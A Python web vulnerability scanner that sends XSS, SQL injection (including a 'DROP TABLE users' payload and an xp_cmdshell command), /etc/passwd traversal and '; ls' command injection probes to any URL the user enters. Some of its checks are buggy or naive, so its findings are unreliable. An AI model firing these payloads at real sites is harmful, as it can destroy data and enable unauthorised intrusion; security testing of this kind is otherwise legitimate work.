import requests
import ssl
import socket
import json
from urllib.parse import urlparse
from bs4 import BeautifulSoup
import dns.resolver
import re

# Function to check HTTP headers for security configurations
def check_http_headers(url):
    print(f"Checking HTTP headers for: {url}")
    try:
        response = requests.get(url)
        headers = response.headers
        report = {
            "X-Content-Type-Options": headers.get("X-Content-Type-Options", "Missing"),
            "Strict-Transport-Security": headers.get("Strict-Transport-Security", "Missing"),
            "X-XSS-Protection": headers.get("X-XSS-Protection", "Missing"),
            "Content-Security-Policy": headers.get("Content-Security-Policy", "Missing"),
            "Referrer-Policy": headers.get("Referrer-Policy", "Missing"),
            "X-Frame-Options": headers.get("X-Frame-Options", "Missing"),
            "Server": headers.get("Server", "Not disclosed"),
            "X-Permitted-Cross-Domain-Policies": headers.get("X-Permitted-Cross-Domain-Policies", "Missing"),
            "Public-Key-Pins": headers.get("Public-Key-Pins", "Missing"),
            "Feature-Policy": headers.get("Feature-Policy", "Missing"),
            "SameSite Cookies": "Present" if 'SameSite' in str(headers.get('Set-Cookie', '')) else "Missing"
        }
        print("HTTP Headers Check Completed.")
        return report
    except requests.exceptions.RequestException as e:
        print(f"Error while fetching headers: {e}")
        return None

# Function to check for CSRF token presence
def check_for_csrf(url):
    print(f"Checking for CSRF protection on: {url}")
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        csrf_token = soup.find('input', {'name': 'csrf_token'})
        if csrf_token:
            print("CSRF token found.")
            return {"CSRF Protection": "Present"}
        else:
            print("CSRF token not found.")
            return {"CSRF Protection": "Missing"}
    except requests.exceptions.RequestException as e:
        print(f"Error checking CSRF protection: {e}")
        return {"Error": f"Error checking CSRF protection: {e}"}

# Function to check for clickjacking protection
def check_clickjacking_protection(url):
    print(f"Checking clickjacking protection for: {url}")
    try:
        response = requests.get(url)
        if 'X-Frame-Options' in response.headers:
            if response.headers['X-Frame-Options'] == 'DENY' or response.headers['X-Frame-Options'] == 'SAMEORIGIN':
                print("Clickjacking protection is present.")
                return {"Clickjacking Protection": "Enabled"}
        elif 'Content-Security-Policy' in response.headers:
            csp = response.headers['Content-Security-Policy']
            if 'frame-ancestors' in csp:
                print("Clickjacking protection via Content-Security-Policy is present.")
                return {"Clickjacking Protection": "Enabled (via CSP)"}
        print("No clickjacking protection found.")
        return {"Clickjacking Protection": "Missing"}
    except requests.exceptions.RequestException as e:
        print(f"Error checking clickjacking protection: {e}")
        return {"Error": f"Error checking clickjacking protection: {e}"}

# Function to check for sensitive information disclosure
def check_sensitive_info(url):
    print(f"Checking for sensitive information disclosure on: {url}")
    try:
        response = requests.get(url)
        sensitive_keywords = ['password', 'username', 'secret', 'private', 'api_key']
        sensitive_data = {}
        for keyword in sensitive_keywords:
            if keyword in response.text.lower():
                sensitive_data[keyword] = "Potential disclosure detected"
                print(f"Sensitive information keyword '{keyword}' found.")
        if not sensitive_data:
            print("No sensitive information found.")
            return {"Sensitive Information": "None detected"}
        return {"Sensitive Information": sensitive_data}
    except requests.exceptions.RequestException as e:
        print(f"Error checking for sensitive information: {e}")
        return {"Error": f"Error checking for sensitive information: {e}"}

# Function to check for subdomain takeover vulnerability
def check_subdomain_takeover(url):
    print(f"Checking for subdomain takeover on: {url}")
    subdomains = ['www', 'dev', 'staging', 'blog', 'test', 'portal', 'shop']
    subdomain_takeover_report = {}
    for subdomain in subdomains:
        subdomain_url = f"{subdomain}.{urlparse(url).netloc}"
        try:
            response = requests.get(f"http://{subdomain_url}", timeout=5)
            if response.status_code == 404:
                subdomain_takeover_report[subdomain_url] = "Potential Subdomain Takeover"
                print(f"Subdomain takeover detected on: {subdomain_url}")
        except requests.exceptions.RequestException:
            continue
    if not subdomain_takeover_report:
        print("No subdomain takeover detected.")
        return {"Subdomain Takeover": "No vulnerable subdomains detected"}
    return {"Subdomain Takeover": subdomain_takeover_report}

# Function to check API security and CORS policy
def check_api_security(url):
    print(f"Checking API security for: {url}")
    try:
        response = requests.options(url)
        allowed_methods = response.headers.get('allow', 'No Allow Header').split(', ')
        cors_header = response.headers.get('Access-Control-Allow-Origin', 'No CORS Header')
        api_security_report = {
            "Allowed HTTP Methods": allowed_methods,
            "CORS Header": cors_header
        }
        print("API Security Check completed.")
        return api_security_report
    except requests.exceptions.RequestException as e:
        print(f"Error checking API security: {e}")
        return {"Error": f"Error checking API security: {e}"}

# Function to check SSL/TLS Configuration (e.g., SSL certificate, weak ciphers)
def check_ssl_configuration(url):
    print(f"Checking SSL/TLS Configuration for: {url}")
    domain = urlparse(url).netloc
    context = ssl.create_default_context()
    
    try:
        conn = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=domain)
        conn.connect((domain, 443))
        ssl_info = conn.getpeercert()
        conn.close()

        ssl_report = {
            "SSL Certificate Validity": ssl_info.get("notAfter", "Unknown"),
            "SSL Issuer": ssl_info.get("issuer", "Unknown")[0][1],
            "SSL Cipher": conn.cipher()[0],
            "SSL Version": conn.cipher()[1]
        }
        print("SSL/TLS Check Completed.")
        return ssl_report
    except Exception as e:
        print(f"SSL/TLS Check failed: {e}")
        return {"Error": f"SSL/TLS Check failed: {e}"}

# Function to check for open redirects
def check_open_redirect(url):
    print(f"Checking for open redirects for: {url}")
    try:
        response = requests.get(url, allow_redirects=True, timeout=5)
        if response.url != url:
            print(f"Open Redirect detected. Redirecting to {response.url}")
            return {"Open Redirect": f"Potential redirect to {response.url}"}
        else:
            print("No open redirects detected.")
            return {"Open Redirect": "No redirect detected"}
    except requests.exceptions.RequestException as e:
        print(f"Error in open redirect check: {e}")
        return {"Error": f"Error in open redirect check: {e}"}

# Function to check for common vulnerabilities (like XSS, SQL Injection, etc.)
def check_for_common_vulnerabilities(url):
    print(f"Checking for common vulnerabilities for: {url}")
    common_vulnerabilities = {}

    # Check for possible XSS by injecting <script> tags
    xss_test_url = f"{url}/?q=<script>alert(1)</script>"
    print(f"Checking for XSS: {xss_test_url}")
    response = requests.get(xss_test_url)
    if "<script>alert(1)</script>" in response.text:
        common_vulnerabilities["XSS (Cross-Site Scripting)"] = "Possible vulnerability detected."
        print("XSS vulnerability detected.")
    else:
        print("XSS Check Passed.")

    # Check for SQL Injection vulnerability by injecting SQL payload
    sql_payloads = [
        "' OR '1'='1",  # Classic boolean-based SQLi
        "' OR 1=1--",    # Classic time-based SQLi
        "'; DROP TABLE users;--",  # SQLi that tries to delete a table
        "1' AND '1'='1", # Another boolean-based SQLi
        "' UNION SELECT NULL, NULL --",  # SQLi for union-based attacks
        "'; SELECT * FROM information_schema.tables --",  # List tables in MySQL
        "'; SELECT DATABASE() --",  # Get current database in MySQL
        "'; SELECT user() --",  # Get current user in MySQL
        "'; SHOW TABLES --",  # Show all tables in the database
        "'; --",  # Comment out the rest of the query
        "'; WAITFOR DELAY '0:0:5' --",  # Time-based SQLi (SQL Server)
        "1; EXEC xp_cmdshell('dir') --",  # Command execution (SQL Server)
        "'; SLEEP(5) --",  # Time-based SQLi for MySQL
    ]
    
    sql_report = {}
    for payload in sql_payloads:
        sql_injection_test_url = f"{url}/?id={payload}"
        print(f"Testing SQL Injection: {sql_injection_test_url}")
        response = requests.get(sql_injection_test_url)
        if "mysql" in response.text.lower() or "syntax" in response.text.lower() or "error" in response.text.lower():
            sql_report[payload] = {
                "Status": "Possible vulnerability detected (error-based SQLi)",
                "Response": response.text[:300],  # Show the first 300 characters of the error message
                "Payload": payload
            }
            print(f"SQL Injection vulnerability detected with payload: {payload}")
            continue

        # Check for abnormal behavior, such as changes in page content
        if response.status_code != 200 or "Warning" in response.text:
            sql_report[payload] = {
                "Status": "Possible vulnerability detected (time-based SQLi or error-based SQLi)",
                "Response": response.text[:300],
                "Payload": payload
            }
            print(f"SQL Injection vulnerability detected with payload: {payload}")
            continue

        print(f"SQL Injection check passed for: {payload}")
    
    # If no SQL injection vulnerabilities detected
    if not sql_report:
        sql_report["No SQL Injection Vulnerability"] = "No obvious SQL injection vulnerabilities detected."
        print("SQL Injection Check Passed.")

    # Check for Directory Traversal vulnerability (e.g., ../../etc/passwd)
    dir_traversal_test_url = f"{url}/?file=../../../../etc/passwd"
    print(f"Checking for Directory Traversal: {dir_traversal_test_url}")
    response = requests.get(dir_traversal_test_url)
    if "root" in response.text:
        common_vulnerabilities["Directory Traversal"] = "Possible vulnerability detected."
        print("Directory Traversal vulnerability detected.")
    else:
        print("Directory Traversal Check Passed.")

    # Check for Command Injection (sending payloads)
    command_injection_test_url = f"{url}/?cmd=; ls"
    print(f"Checking for Command Injection: {command_injection_test_url}")
    response = requests.get(command_injection_test_url)
    if "bin" in response.text or "root" in response.text:
        common_vulnerabilities["Command Injection"] = "Possible vulnerability detected."
        print("Command Injection vulnerability detected.")
    else:
        print("Command Injection Check Passed.")

    if not common_vulnerabilities:
        common_vulnerabilities["General Vulnerabilities"] = "No obvious vulnerabilities detected."
        print("No common vulnerabilities detected.")

    return common_vulnerabilities, sql_report

# Function to scan a website and generate a report
def scan_website(url):
    print(f"\nStarting scan for website: {url}\n")
    report = {}

    # 1. Check HTTP headers
    http_headers_report = check_http_headers(url)
    report["HTTP Headers"] = http_headers_report

    # 2. Check SSL/TLS Configuration
    ssl_report = check_ssl_configuration(url)
    report["SSL/TLS Configuration"] = ssl_report

    # 3. Check for open redirects
    open_redirect_report = check_open_redirect(url)
    report["Open Redirects"] = open_redirect_report

    # 4. Check for common vulnerabilities
    common_vulnerabilities_report, sql_report = check_for_common_vulnerabilities(url)
    report["Common Vulnerabilities"] = common_vulnerabilities_report
    report["SQL Injection Report"] = sql_report

    # 5. Check CSRF Protection
    csrf_report = check_for_csrf(url)
    report["CSRF Protection"] = csrf_report

    # 6. Check Clickjacking Protection
    clickjacking_report = check_clickjacking_protection(url)
    report["Clickjacking Protection"] = clickjacking_report

    # 7. Check for Sensitive Information Disclosure
    sensitive_info_report = check_sensitive_info(url)
    report["Sensitive Information"] = sensitive_info_report

    # 8. Check Subdomain Takeover
    subdomain_takeover_report = check_subdomain_takeover(url)
    report["Subdomain Takeover"] = subdomain_takeover_report

    # 9. Check API Security
    api_security_report = check_api_security(url)
    report["API Security"] = api_security_report

    return report

# Function to generate a comprehensive security report
def generate_report(url):
    print(f"\nGenerating detailed security report for: {url}")
    report = scan_website(url)

    # Print the results of the scan
    print("\nSecurity Report:")
    print(json.dumps(report, indent=4))

    # Save the report to a JSON file
    report_filename = f"vulnerability_report_{urlparse(url).netloc}.json"
    with open(report_filename, "w") as report_file:
        json.dump(report, report_file, indent=4)
    print(f"\nReport saved as {report_filename}")

# Main function to accept user input and run the scanner
if __name__ == "__main__":
    url = input("Enter the website URL (e.g., http://example.com): ").strip()
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url
    
    generate_report(url)
